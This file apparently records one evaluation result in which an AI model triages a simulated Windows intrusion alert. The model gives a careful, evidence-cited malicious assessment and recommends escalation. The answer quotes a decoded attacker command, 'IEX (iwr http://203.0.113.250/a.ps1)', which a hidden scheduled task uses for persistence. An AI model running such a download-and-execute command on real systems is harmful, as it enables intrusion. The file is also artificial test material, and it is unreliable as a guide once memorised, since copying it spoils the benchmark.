@@ -1,0 +1,91 @@
+{
+ "scenario_id": "T047",
+ "condition": "C2",
+ "variant": "P2",
+ "backend": "openai:gpt-6.1-sol",
+ "sample": 0,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.95,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"The alerted account creation is confirmed at 13:43:55 UTC, rather than approximately 13:42: DC-NWD-01 recorded creation of NWD\\\\sysmaint by sam.okafor under DC logon ID 0xcb3d075.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00081\"]\n    },\n    {\n      \"claim\": \"Less than one second after creation, the same DC logon ID added sysmaint to a group labeled Administrators. The member SID matches the newly created account. The record's group SID ends in -512, so its precise group identity should be verified rather than inferred solely from its displayed name.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00081\", \"T047-00082\"]\n    },\n    {\n      \"claim\": \"At 13:39:54 UTC, sam.okafor successfully logged on remotely to WS-LMARTINS-01 using RDP from 203.0.113.250, with workstation logon ID 0x34cf8fb. This source does not match the supplied inventory's authorized administration origin, WS-SOKAFOR-01.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"T047-00063\", \"T047-00064\", \"T047-00065\"]\n    },\n    {\n      \"claim\": \"At 13:43:57 UTC, the same workstation RDP logon ID registered the task \\\\Microsoft\\\\Windows\\\\HealthCheck. Its action invokes PowerShell with no profile, a hidden window, and an encoded command that decodes to IEX (iwr http://203.0.113.250/a.ps1), instructing download and execution from the RDP source address.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00065\", \"T047-00083\"]\n    },\n    {\n      \"claim\": \"Creation and immediate privileged-group addition of sysmaint, followed within seconds by a download-and-execute task under the same account identity associated with anomalous RDP access, support malicious account provisioning rather than routine patching or temporary-account creation. This is a correlated sequence, not a proven mapping between the DC and workstation logon sessions.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"T047-00065\", \"T047-00081\", \"T047-00082\", \"T047-00083\"]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"The supplied records do not include the DC authentication event for logon ID 0xcb3d075; the account-management events therefore do not establish their originating workstation or directly link that session to workstation logon ID 0x34cf8fb (T047-00065, T047-00081, T047-00082).\",\n    \"Task registration establishes the configured command, not successful task execution, payload retrieval, or payload behavior (T047-00083).\",\n    \"The group name and SID in the membership event require reconciliation before assigning an exact privileged-group identity (T047-00082).\"\n  ],\n  \"claims_not_established\": [\n    \"Whether sam.okafor personally performed these actions or another actor used the account is not established by the authenticated identities (T047-00065, T047-00081, T047-00083).\",\n    \"Subsequent authentication or use of sysmaint is not established by its creation and membership events (T047-00081, T047-00082).\",\n    \"Successful payload execution, credential theft, and data exfiltration are not established by the task definition (T047-00083).\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Retrieve DC authentication and account-management telemetry for logon ID 0xcb3d075 to identify the source of the sysmaint changes (T047-00081, T047-00082).\",\n    \"Resolve the group SID and obtain current sysmaint account status, memberships, and subsequent authentication history (T047-00081, T047-00082).\",\n    \"Collect Task Scheduler execution events, PowerShell script-block logs, process telemetry, and network records for the HealthCheck task and its configured URL (T047-00083).\",\n    \"Confirm authorization with sam.okafor through a trusted channel and investigate the origin of the RDP session from 203.0.113.250 (T047-00065).\"\n  ],\n  \"unrelated_findings\": []\n}",
+   "valid": true,
+   "errors": [],
+   "usage": {
+    "input": 27903,
+    "output": 1076
+   }
+  }
+ ],
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.95,
+  "supporting_observations": [
+   {
+    "claim": "The alerted account creation is confirmed at 13:43:55 UTC, rather than approximately 13:42: DC-NWD-01 recorded creation of NWD\\sysmaint by sam.okafor under DC logon ID 0xcb3d075.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00081"
+    ]
+   },
+   {
+    "claim": "Less than one second after creation, the same DC logon ID added sysmaint to a group labeled Administrators. The member SID matches the newly created account. The record's group SID ends in -512, so its precise group identity should be verified rather than inferred solely from its displayed name.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00081",
+     "T047-00082"
+    ]
+   },
+   {
+    "claim": "At 13:39:54 UTC, sam.okafor successfully logged on remotely to WS-LMARTINS-01 using RDP from 203.0.113.250, with workstation logon ID 0x34cf8fb. This source does not match the supplied inventory's authorized administration origin, WS-SOKAFOR-01.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T047-00063",
+     "T047-00064",
+     "T047-00065"
+    ]
+   },
+   {
+    "claim": "At 13:43:57 UTC, the same workstation RDP logon ID registered the task \\Microsoft\\Windows\\HealthCheck. Its action invokes PowerShell with no profile, a hidden window, and an encoded command that decodes to IEX (iwr http://203.0.113.250/a.ps1), instructing download and execution from the RDP source address.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00065",
+     "T047-00083"
+    ]
+   },
+   {
+    "claim": "Creation and immediate privileged-group addition of sysmaint, followed within seconds by a download-and-execute task under the same account identity associated with anomalous RDP access, support malicious account provisioning rather than routine patching or temporary-account creation. This is a correlated sequence, not a proven mapping between the DC and workstation logon sessions.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T047-00065",
+     "T047-00081",
+     "T047-00082",
+     "T047-00083"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "The supplied records do not include the DC authentication event for logon ID 0xcb3d075; the account-management events therefore do not establish their originating workstation or directly link that session to workstation logon ID 0x34cf8fb (T047-00065, T047-00081, T047-00082).",
+   "Task registration establishes the configured command, not successful task execution, payload retrieval, or payload behavior (T047-00083).",
+   "The group name and SID in the membership event require reconciliation before assigning an exact privileged-group identity (T047-00082)."
+  ],
+  "claims_not_established": [
+   "Whether sam.okafor personally performed these actions or another actor used the account is not established by the authenticated identities (T047-00065, T047-00081, T047-00083).",
+   "Subsequent authentication or use of sysmaint is not established by its creation and membership events (T047-00081, T047-00082).",
+   "Successful payload execution, credential theft, and data exfiltration are not established by the task definition (T047-00083)."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Retrieve DC authentication and account-management telemetry for logon ID 0xcb3d075 to identify the source of the sysmaint changes (T047-00081, T047-00082).",
+   "Resolve the group SID and obtain current sysmaint account status, memberships, and subsequent authentication history (T047-00081, T047-00082).",
+   "Collect Task Scheduler execution events, PowerShell script-block logs, process telemetry, and network records for the HealthCheck task and its configured URL (T047-00083).",
+   "Confirm authorization with sam.okafor through a trusted channel and investigate the origin of the RDP session from 203.0.113.250 (T047-00065)."
+  ],
+  "unrelated_findings": []
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 12,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 16.6
+}
